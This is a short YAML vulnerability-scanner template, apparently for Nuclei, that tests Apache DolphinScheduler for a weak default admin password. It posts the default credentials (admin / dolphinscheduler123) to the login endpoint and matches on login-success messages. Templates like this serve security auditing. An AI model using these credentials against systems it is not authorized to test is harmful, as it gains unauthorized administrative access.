id: dolphinscheduler-weak-pass
info:
  name: DolphinScheduler Weak Password Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password
http:
  - method: POST
    path:
      - "{{BaseURL}}/dolphinscheduler/login"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "userName=admin&userPassword=dolphinscheduler123"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "\"msg\":\"login success\""
      - type: word
        words:
          - "\"msg\":\"登录成功\",\"data\":{\"sessionId\""
